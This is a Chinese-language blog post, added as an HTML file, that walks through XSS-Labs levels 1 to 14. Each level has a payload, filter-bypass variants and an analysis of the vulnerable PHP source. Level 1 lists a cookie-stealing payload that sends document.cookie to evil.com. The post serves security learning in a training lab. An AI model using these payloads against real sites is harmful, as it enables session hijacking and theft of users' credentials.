@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS-Labs 通关详细笔记 - 我的个人博客</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="stylesheet" href="../css/markdown.css">
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>我的个人博客</h1>
+            <nav>
+                <span><a href="../index.html" class="no-underline">首页</a></span>
+            </nav>
+        </header>
+
+        <main>
+            <div class="messages-list">
+                <div class="messages-header">
+                    <h3>XSS-Labs 通关详细笔记</h3>
+                    <a href="../index.html" class="btn">返回首页</a>
+                </div>
+
+                <div class="message-item">
+                    <div class="message-header">
+                        <span class="username">技术分享</span>
+                        <span class="time">2025-12-20</span>
+                    </div>
+                    <div class="message-content">
+                        <div class="markdown-content">
+                            <h1>🎯 XSS基础概念</h1>
+                            <h3>什么是XSS？</h3>
+                            <p>跨站脚本攻击（Cross-Site Scripting），由于缩写与CSS重叠，因此通常被称为<strong>XSS</strong>。</p>
+                            <h3>XSS能做什么？</h3>
+                            <ul>
+                                <li>窃取用户密码</li>
+                                <li>实现无密码登录</li>
+                                <li>执行任意客户端脚本</li>
+                                <li>劫持用户会话</li>
+                                <li>钓鱼攻击</li>
+                                <li>恶意重定向</li>
+                            </ul>
+                            <h3>XSS主要类型</h3>
+                            <ol>
+                                <li><strong>DOM型XSS</strong> - 通过修改DOM结构执行恶意脚本</li>
+                                <li><strong>存储型XSS</strong> - 恶意代码存储在服务器上，影响所有访问者</li>
+                                <li><strong>反射型XSS</strong> - 恶意代码通过URL参数反射给受害者</li>
+                            </ol>
+                            <p>在XSS-Labs中，我们的主要目标是寻找注入点，在网站上执行任意Script脚本。本文将从<strong>payload构造</strong>和<strong>源码分析</strong>两个角度深入探讨每个关卡。
+                            </p>
+                            <hr>
+                            <h2>🎯 关卡1-20详解</h2>
+                            <h3>Level 1: 基础反射型XSS</h3>
+                            <h4>攻击过程</h4>
+                            <p>这是一个基于GET请求的网页，我们可以在URL地址栏中直接修改参数内容。</p>
+                            <p>在<code>?name=</code>后面输入如下脚本：</p>
+                            <pre><code class="language-html">&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li><code>echo</code>采用了字符串拼接，没有进行任何过滤</li>
+                                <li>输入的JS脚本直接输出到HTML中</li>
+                                <li>这是最典型的反射型XSS漏洞</li>
+                            </ul>
+                            <p><strong>payload变体</strong>：</p>
+                            <pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;document.cookie&lt;/script&gt;
+&lt;script&gt;location.href='http://evil.com?cookie='+document.cookie&lt;/script&gt;</code></pre>
+                            <hr>
+                            <h3>Level 2: HTML实体编码绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>在input标签中输入<code>&lt;script&gt;alert()&lt;/script&gt;</code>，发现内容被转义：</p>
+                            <pre><code class="language-html">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;
+&lt;center&gt;
+&lt;input name=keyword  value=&quot;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</code></pre>
+                            <p><strong>关键发现</strong>：<code>&lt;</code>和<code>&gt;</code>等字符被进行了HTML实体编码，导致脚本无法直接执行。</p>
+                            <p><strong>绕过思路</strong>：尝试闭合input标签</p>
+                            <pre><code class="language-html">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+                            <p>页面源码变为：</p>
+                            <pre><code class="language-html">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>第一处输出使用了<code>htmlspecialchars()</code>函数进行转义</li>
+                                <li>第二处输出直接使用<code>$str</code>，存在XSS漏洞</li>
+                                <li><code>htmlspecialchars()</code>只转义<code>&amp;</code>, <code>&quot;</code>,
+                                    <code>'</code>,
+                                    <code>&lt;</code>, <code>&gt;</code>字符
+                                </li>
+                            </ul>
+                            <p><strong>payload变体</strong>：</p>
+                            <pre><code class="language-html">&quot; onclick=alert() &quot;
+&quot; onmouseover=alert() &quot;
+&quot; autofocus onfocus=alert()</code></pre>
+                            <hr>
+                            <h3>Level 3: 单引号闭合与事件绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入<code>&lt;script&gt;alert()&lt;/script&gt;</code>查看页面源码：</p>
+                            <pre><code class="language-html">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;
+&lt;center&gt;
+&lt;input name=keyword  value='&lt;script&gt;alert()&lt;/script&gt;'&gt;</code></pre>
+                            <p>尝试闭合input标签：</p>
+                            <pre><code class="language-html">'&gt;&lt;script&gt;alert()&lt;/script&gt;</code></pre>
+                            <p>页面源码：</p>
+                            <pre><code class="language-html">&lt;input name=keyword  value=''&gt;&lt;script&gt;alert()&lt;/script&gt;'&gt;</code></pre>
+                            <p>发现两处都被转义了，但单引号未被过滤。尝试利用input标签的属性：</p>
+                            <pre><code class="language-html">' onclick=alert() '</code></pre>
+                            <p>注入成功！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='".htmlspecialchars($str).&quot;'&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>两处都使用了<code>htmlspecialchars()</code>进行转义</li>
+                                <li>input标签使用单引号包裹value值</li>
+                                <li>通过闭合单引号并添加事件处理器绕过</li>
+                            </ul>
+                            <p><strong>常用JS事件</strong>：</p>
+                            <pre><code class="language-javascript">// 鼠标事件
+onclick        // 鼠标点击时触发
+onmouseover    // 鼠标划过时触发
+onmouseout     // 鼠标离开时触发
+onmousedown    // 鼠标按下时触发
+onmouseup      // 鼠标松开时触发
+onmousemove    // 鼠标移动时触发
+
+// 键盘事件
+onkeydown      // 键盘按下时触发
+onkeyup        // 键盘松开时触发
+onkeypress     // 键盘按下并松开时触发
+
+// 表单事件
+onsubmit       // 表单提交时触发
+onreset        // 表单重置时触发
+onchange       // 元素值改变时触发
+onfocus        // 元素获得焦点时触发
+onblur         // 元素失去焦点时触发
+
+// 页面事件
+onload         // 页面完全加载完成后触发
+onunload       // 页面关闭或刷新时触发
+onresize       // 窗口大小改变时触发
+onscroll       // 页面滚动时触发</code></pre>
+                            <hr>
+                            <h3>Level 4: 双引号过滤与标签绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入<code>&lt;script&gt;alert()&lt;/script&gt;</code>查看页面源码：</p>
+                            <pre><code class="language-html">&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;
+&lt;center&gt;
+&lt;input name=keyword  value=&quot;scriptalert()/script&quot;&gt;</code></pre>
+                            <p>发现<code>&lt;</code>和<code>&gt;</code>被过滤，但双引号保留。尝试事件绕过：</p>
+                            <pre><code class="language-html">&quot; onclick=alert() &quot;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用<code>str_replace()</code>函数过滤<code>&lt;</code>和<code>&gt;</code>字符</li>
+                                <li>第一处输出仍使用<code>htmlspecialchars()</code>转义</li>
+                                <li>第二处输出直接使用过滤后的字符串</li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&quot; onclick=alert() &quot;
+&quot; onmouseover=alert() &quot;
+&quot; autofocus onfocus=alert()</code></pre>
+                            <hr>
+                            <h3>Level 5: JavaScript伪协议与大小写绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入<code>&lt;script&gt;alert()&lt;/script&gt;</code>发现被过滤。尝试大小写混合：</p>
+                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;</code></pre>
+                            <p>仍然被过滤。尝试其他标签：</p>
+                            <pre><code class="language-html">&lt;img src=x onerror=alert()&gt;</code></pre>
+                            <p>发现<code>on</code>被过滤。使用JavaScript伪协议：</p>
+                            <pre><code class="language-html">&lt;a href=&quot;javascript:alert()&quot;&gt;click me&lt;/a&gt;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用<code>strtolower()</code>将输入转换为小写</li>
+                                <li>使用<code>str_replace()</code>替换<code>&lt;script</code>为<code>&lt;scr_ipt</code></li>
+                                <li>使用<code>str_replace()</code>替换<code>on</code>为<code>o_n</code></li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
+&lt;iframe src=javascript:alert()&gt;
+&lt;img src=x onerror=alert()&gt;
+&lt;svg onload=alert()&gt;</code></pre>
+                            <hr>
+                            <h3>Level 6: 大小写混合与双写绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>尝试大小写混合：</p>
+                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;</code></pre>
+                            <p>成功！说明大小写绕过有效。</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>过滤了多个关键词：<code>&lt;script</code>, <code>on</code>, <code>src</code>,
+                                    <code>data</code>,
+                                    <code>href</code>
+                                </li>
+                                <li>但没有使用<code>strtolower()</code>，可以通过大小写绕过</li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&lt;ScRiPt&gt;alert()&lt;/ScRiPt&gt;
+&lt;IMG SRC=x ONERROR=alert()&gt;
+&lt;SVG ONLOAD=alert()&gt;
+&lt;IFRAME SRC=javascript:alert()&gt;</code></pre>
+                            <hr>
+                            <h3>Level 7: 双写过滤绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入<code>&lt;script&gt;alert()&lt;/script&gt;</code>发现被过滤。尝试双写：</p>
+                            <pre><code class="language-html">&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str =$_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str2.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用<code>str_replace(&quot;script&quot;,&quot;&quot;,$str)</code>删除<code>script</code>字符串
+                                </li>
+                                <li>双写可以绕过单次删除：<code>scrscriptipt</code> → <code>script</code></li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&lt;scrscriptipt&gt;alert()&lt;/scrscriptipt&gt;
+&lt;imimgg src=x onerror=alert()&gt;
+&lt;onerror&gt;alert()&lt;/onerror&gt;</code></pre>
+                            <hr>
+                            <h3>Level 8: HTML实体编码与JavaScript伪协议</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入各种payload都被转义。查看页面源码发现使用了HTML实体编码。尝试JavaScript伪协议：</p>
+                            <pre><code class="language-html">javascript:alert()</code></pre>
+                            <p>发现被添加到<code>href</code>属性中，但需要HTML实体编码：</p>
+                            <pre><code class="language-html">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot;',$str6);
+echo '&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php 
+echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>多重过滤机制</li>
+                                <li>输出时使用<code>htmlspecialchars()</code>和额外的引号转义</li>
+                                <li>友情链接处直接输出，但需要HTML实体编码</li>
+                            </ul>
+                            <p><strong>HTML实体编码表</strong>：</p>
+                            <pre><code class="language-html">&amp;#106; = j
+&amp;#97;  = a
+&amp;#118; = v
+&amp;#97;  = a
+&amp;#115; = s
+&amp;#99;  = c
+&amp;#114; = r
+&amp;#105; = i
+&amp;#112; = p
+&amp;#116; = t
+&amp;#58;  = :
+&amp;#97;  = a
+&amp;#108; = l
+&amp;#101; = e
+&amp;#114; = r
+&amp;#116; = t
+&amp;#40;  = (
+&amp;#39;  = '
+&amp;#88;  = X
+&amp;#83;  = S
+&amp;#83;  = S
+&amp;#39;  = '
+&amp;#41;  = )</code></pre>
+                            <hr>
+                            <h3>Level 9: URL检测绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>输入<code>javascript:alert()</code>发现需要包含合法URL。尝试：</p>
+                            <pre><code class="language-html">javascript://http://test.com%0aalert()</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot;',$str6);
+echo '&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php 
+if(false===strpos($str7,'http://')){
+    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}else{
+    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>检测输入是否包含<code>http://</code>字符串</li>
+                                <li>使用<code>strpos()</code>函数进行URL验证</li>
+                                <li>可以通过JavaScript注释绕过</li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">javascript://http://test.com%0aalert()
+javascript:http://test.com%0dalert()
+javascript:http://test.com%0a%0dalert()</code></pre>
+                            <hr>
+                            <h3>Level 10: 隐藏字段操作</h3>
+                            <h4>攻击过程</h4>
+                            <p>查看页面源码发现隐藏的input字段：</p>
+                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_link&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;t_history&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;t_sort&quot; value=&quot;&quot;&gt;</code></pre>
+                            <p>尝试修改<code>t_sort</code>参数：</p>
+                            <pre><code class="language-html">?keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert()</code></pre>
+                            <p>成功注入！</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level10.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>有三个隐藏字段：<code>t_link</code>, <code>t_history</code>, <code>t_sort</code></li>
+                                <li>只有<code>t_sort</code>可以被修改</li>
+                                <li>过滤了<code>&lt;</code>和<code>&gt;</code>字符</li>
+                                <li>通过闭合双引号和改变input类型绕过</li>
+                            </ul>
+                            <p><strong>绕过技巧</strong>：</p>
+                            <pre><code class="language-html">&quot; type=&quot;text&quot; onmouseover=&quot;alert()
+&quot; type=&quot;text&quot; onclick=&quot;alert()
+&quot; type=&quot;text&quot; autofocus onfocus=&quot;alert()</code></pre>
+                            <hr>
+                            <h3>Level 11: Referer头注入</h3>
+                            <h4>攻击过程</h4>
+                            <p>查看页面源码发现：</p>
+                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_ref&quot; value=&quot;您来自哪里？&quot;&gt;</code></pre>
+                            <p>需要修改HTTP Referer头：</p>
+                            <pre><code class="language-html">Referer: &quot; type=&quot;text&quot; onmouseover=&quot;alert()&quot;</code></pre>
+                            <p>使用Burp Suite或浏览器插件修改Referer头即可成功注入。</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_REFERER'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level11.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
+&lt;input name=t_ref type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>从<code>$_SERVER['HTTP_REFERER']</code>获取Referer头</li>
+                                <li>过滤了<code>&lt;</code>和<code>&gt;</code>字符</li>
+                                <li>通过闭合双引号和添加事件绕过</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 12: User-Agent头注入</h3>
+                            <h4>攻击过程</h4>
+                            <p>查看页面源码发现：</p>
+                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_ua&quot; value=&quot;&quot;&gt;</code></pre>
+                            <p>需要修改HTTP User-Agent头：</p>
+                            <pre><code class="language-html">User-Agent: &quot; type=&quot;text&quot; onmouseover=&quot;alert()&quot;</code></pre>
+                            <p>使用Burp Suite修改User-Agent头即可成功注入。</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_USER_AGENT'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level12.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
+&lt;input name=t_ua type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>从<code>$_SERVER['HTTP_USER_AGENT']</code>获取User-Agent头</li>
+                                <li>过滤机制与Level 11相同</li>
+                                <li>通过修改HTTP头注入XSS</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 13: Cookie注入</h3>
+                            <h4>攻击过程</h4>
+                            <p>查看页面源码发现：</p>
+                            <pre><code class="language-html">&lt;input type=&quot;hidden&quot; name=&quot;t_cook&quot; value=&quot;&quot;&gt;</code></pre>
+                            <p>需要修改Cookie：</p>
+                            <pre><code class="language-javascript">document.cookie = &quot;user=\&quot; type=\&quot;text\&quot; onmouseover=\&quot;alert()\&quot;; path=/&quot;;</code></pre>
+                            <p>或者使用浏览器开发者工具修改Cookie值。</p>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE['user'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level13.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input name=t_sort type=&quot;hidden&quot; value=&quot;'.$str00.'&quot;&gt;
+&lt;input name=t_cook type=&quot;hidden&quot; value=&quot;'.$str33.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>从<code>$_COOKIE['user']</code>获取Cookie值</li>
+                                <li>过滤机制与之前相同</li>
+                                <li>通过Cookie注入XSS</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 14: iframe沙箱绕过</h3>
+                            <h4>攻击过程</h4>
+                            <p>这一关使用了iframe标签和exif模块。需要通过图片的EXIF信息注入XSS。</p>
+                            <p>准备包含XSS的图片：</p>
+                            <pre><code class="language-html">&lt;img src=x onerror=alert()&gt;</code></pre>
+                            <p>或者使用iframe标签：</p>
+                            <pre><code class="language-html">&lt;iframe src=&quot;level14.php?name=&lt;script&gt;alert()&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></pre>
+                            <h4>源码分析</h4>
+                            <pre><code class="language-php">&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+header(&quot;Content-type: text/html;charset=utf-8&quot;);
+echo '&lt;body&gt;';
+if(isset($_GET[&quot;submit&quot;])){
+    $file = $_FILES[&quot;upload_file&quot;];
+    $allowed_type = array(&quot;image/jpeg&quot;,&quot;image/gif&quot;,&quot;image/png&quot;);
+    if(!in_array($file[&quot;type&quot;],$allowed_type)){
+        echo &quot;&lt;script&gt;alert('文件类型不正确！');&lt;/script&gt;&quot;;
+    }else{
+        $filename = $file[&quot;name&quot;];
+        $exif = exif_read_data($file[&quot;tmp_name&quot;]);
+        $html = &quot;&lt;center&gt;&lt;img src='$filename'&gt;&lt;/center&gt;&quot;;
+        echo $html;
+        if($exif['Make'] != ''){
+            echo &quot;&lt;center&gt;&quot;.$exif['Make'].&quot;&lt;/center&gt;&quot;;
+        }
+        if($exif['Model'] != ''){
+            echo &quot;&lt;center&gt;&quot;.$exif['Model'].&quot;&lt;/center&gt;&quot;;
+        }
+        if($exif['ExifVersion'] != ''){
+            echo &quot;&lt;center&gt;&quot;.$exif['ExifVersion'].&quot;&lt;/center&gt;&quot;;
+        }
+    }
+}
+echo '&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;upload_file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;';
+?&gt;</code></pre>
+                            <p><strong>原理解析</strong>：</p>
+                            <ul>
+                                <li>使用<code>exif_read_data()</code>读取图片EXIF信息</li>
+                                <li>直接输出EXIF信息到页面</li>
+                                <li>通过修改图片EXIF信息注入XSS</li>
+                            </ul>
+                            <hr>
+                            <h3>Level 15: AngularJS模板注入</h3>
+                            <h4>攻击过程</h4>
